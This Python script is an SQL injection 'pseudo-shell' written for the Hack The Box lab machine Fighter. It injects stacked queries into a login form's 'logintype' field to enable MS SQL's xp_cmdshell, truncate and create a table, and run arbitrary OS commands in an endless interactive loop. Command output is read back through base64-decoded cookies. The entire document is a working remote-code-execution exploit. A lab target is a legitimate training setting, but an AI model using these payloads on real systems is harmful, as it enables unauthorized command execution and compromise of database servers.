#SQL Injection Pseudo-Shell for HTB's Fighter
#MS SQL 2014

import requests
from base64 import b64decode
from urllib.parse import unquote
import time

def getOutput():
    getIndex = "1 union select 1,2,3,4,(select top 1 ID from test order by ID desc),6-- -" #This helps get the max number of lines from the table
    r = makeRequest(getIndex)
    count = int(decodeCookies(r.cookies)) #Extracing the number from b64decoding the email

    for i in range(1,count):
        line = makeRequest(f'1 union select 1,2,3,4,(select output from test where ID = {i}),6-- -')
        try:
            output = decodeCookies(line.cookies)
            print(output.decode())
        except:
            None


def makeRequest(action):
    URL = "http://members.streetfighterclub.htb/old/verify.asp"
    return requests.post(URL, allow_redirects=False, data={'username':'admin','password':'admin','logintype':action,'rememberme':'ON','B1':'LogIn'})

def runCMD(Input):
    truncatingTable = "1;TRUNCATE TABLE test;" #Removes records from the table
    makeRequest(truncatingTable)
    Input = Input.replace("'","''") #replaces the single quotes to double quotues below for Input
    makeRequest(f"1;insert into test (output) exec Xp_CmDShelL '{Input}';-- -")
    getOutput()

def decodeCookies(cookies): #b64 decode the email
    return b64decode(unquote(cookies['Email']))

def Setup(Input):

    TurnOnXPShell = "1;EXEC sp_configure 'show advanced options', 1; exec sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -" #For good measure
        
    NewTable = "3;CREATE TABLE test (ID int IDENTITY(1,1) PRIMARY KEY, output varchar(1024))" 

    makeRequest(TurnOnXPShell) 

    makeRequest(NewTable)
   
    runCMD(Input)

def main():
    
    print("░██████╗░██████╗░██╗░░░░░")
    print("██╔════╝██╔═══██╗██║░░░░░")
    print("╚█████╗░██║██╗██║██║░░░░░")
    print("░╚═══██╗╚██████╔╝██║░░░░░")
    print("██████╔╝░╚═██╔═╝░███████╗")
    print("╚═════╝░░░░╚═╝░░░╚══════╝")
    print("\n")
    time.sleep(1)

    while True: #Endless loop so RCE doesn't end
        Input = input("SQL RCE: ")
        Setup(Input)

if __name__ == "__main__":
    main()
